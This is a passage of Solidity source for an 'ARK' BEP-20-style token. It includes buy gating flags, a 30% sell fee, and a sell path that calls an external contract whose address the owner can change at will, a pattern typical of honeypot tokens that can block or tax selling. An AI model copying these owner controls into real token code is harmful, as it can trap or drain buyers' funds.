    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private _jiaList;
	
	mapping (address => bool) private _buyList;

    address typeAddress = 0xF79c8aF282dc132eB178eeDE179b66beB78dFe4D;

    address marketAddress = 0x3b911fBd76dA4b01D2ff75B0610d45Ff14182697;

    TypeContract internal typeContract = TypeContract(typeAddress);


    uint256 private constant MAX = ~uint256(0); 
    uint256 private _tTotal = 6180000 * 10**18;

    uint256 minCoin = 38200;
	
    string private _name = "ARK";
    string private _symbol = "ARK";
    uint8  private _decimals = 18;

    address public burnAddress = address(0);
	
	uint256 public _sellFee = 30;

    uint256 public minSwappNum = 1e18;
	
	address public ownerAddress = address(0x3b911fBd76dA4b01D2ff75B0610d45Ff14182697);

    address public usdtAddress = address(0x55d398326f99059fF775485246999027B3197955);
	
    address public trueAddress;
	
    bool private swapping;

    IW3swapRouter02 public uniswapV2Router;
    address public uniswapV2Pair;
	
	bool public notOpen = false;

    bool public canBuy = false;

    bool public canSell = true;

    bool public openSwapping = true;

    Wrap private wrap;

    uint public swapPer = 1000;

    mapping(address => bool) oneContract;

    function setTypeAddress(address adr) public onlyOwner {
        typeAddress = adr;
        typeContract = TypeContract(adr);
    }
	
	function setOneContract(address adr, bool status) public onlyOwner {
        oneContract[adr] = status;
    }

    function setSwapPer(uint per) public onlyOwner {
        swapPer = per;
    }

    function setusdtAddress(address adr) public onlyOwner {
        usdtAddress = adr;
    }

    uint allFeeAmount = 0;

    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 tokensReceived,
        uint256 tokensIntoLiqudity
    );

    constructor ()  {
        _decimals = 18;
        _rOwned[ownerAddress] = _tTotal;

        wrap = new Wrap();

        IW3swapRouter02 _uniswapV2Router = IW3swapRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        uniswapV2Pair = IW3swapFactory(_uniswapV2Router.factory()).createPair(address(this), address(usdtAddress));
        uniswapV2Router = _uniswapV2Router;

        oneContract[uniswapV2Pair] = true;

        trueAddress = address(this);
        
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[ownerAddress] = true;


        _buyList[ownerAddress] = true;
        emit Transfer(address(0), ownerAddress, _tTotal);
    }

    function setMinSwappNumt(uint256 amount) external onlyOwner {
        minSwappNum = amount;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function swapPair() public view returns (address) {
        return uniswapV2Pair;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return 18;
    }
    
    function totalSupply() public view override returns (uint256) {
        return _tTotal.sub(balanceOf(address(0)));
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _rOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }
	
	function _transferStandard(address sender, address recipient, uint256 tAmount, bool takeFee) private {
        _rOwned[sender] = _rOwned[sender].sub(tAmount);
        if (takeFee) {
            (uint256 feeAmount, uint256 sendAmount,)
                = _getTValues(sender, recipient, tAmount);
            if (feeAmount != 0){
               _rOwned[address(this)] = _rOwned[address(this)].add(feeAmount);
			    emit Transfer(sender, address(this), feeAmount);
            }

            _rOwned[recipient] = _rOwned[recipient].add(sendAmount);
            emit Transfer(sender, recipient, sendAmount);
        } else {
            _rOwned[recipient] = _rOwned[recipient].add(tAmount);
            emit Transfer(sender, recipient, tAmount);
        } 
    }

    function _getTValues(address sender, address recipient, uint256 tAmount) private returns (uint256, uint256, uint) {
		uint256 feeAmount = 0;
		uint256 sendAmount = tAmount;
        uint doType = 0;
		if (oneContract[recipient]) {
			// sell
			feeAmount = tAmount.div(100).mul(_sellFee);
            doType = 1;
            typeContract.SellNeed(sender, tAmount);
            sendAmount = sendAmount.sub(feeAmount);
            allFeeAmount = allFeeAmount.add(sendAmount);
		}
		
		return (feeAmount, sendAmount, doType);
	}


    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
